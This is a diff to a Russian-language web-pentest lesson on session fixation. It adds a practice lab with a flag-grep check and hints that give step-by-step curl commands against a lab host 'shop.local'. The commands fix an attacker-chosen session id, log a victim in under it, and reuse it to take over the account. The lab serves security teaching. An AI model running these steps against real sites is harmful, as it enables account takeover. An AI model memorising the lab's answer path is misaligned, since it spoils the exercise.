@@ -13,6 +13,18 @@ useful_for:
   - "Пентест веб-приложений"
 estimated_minutes: 30
 summary: "Как зафиксировать чужую сессию: до логина и после, через URL/куку/поддомен, и как это превращается в захват аккаунта."
+lab:
+  kind: shell
+  title: "Практика: session fixation"
+  toolset: [core, curl]
+  workdir: /home/student/task
+  files: [task.md]
+  check: "grep -q 'nto{' found.txt"
+  hints:
+    - Проверь, что id сессии берётся из URL: `curl -s -i 'https://shop.local/login?session=ATTACKER123'`.
+    - Сессия не ротируется: `Set-Cookie` остаётся тем же и после логина.
+    - Залогинь жертву с нашим id: `curl -s -i -b 'session=ATTACKER123' -X POST 'https://shop.local/login' --data 'user=victim&pass=x'`.
+    - Зайди тем же id в аккаунт: `curl -s -b 'session=ATTACKER123' 'https://shop.local/account' | grep 'nto{' > found.txt`, затем `check`.
 ---
 
 В прошлом уроке мы заметили, что если сервер не меняет идентификатор сессии при логине — это опасно. Теперь разберём эту атаку как отдельную технику: **session fixation** (фиксация сессии). Она позволяет войти в чужой аккаунт, не зная пароля и не крадя cookie.
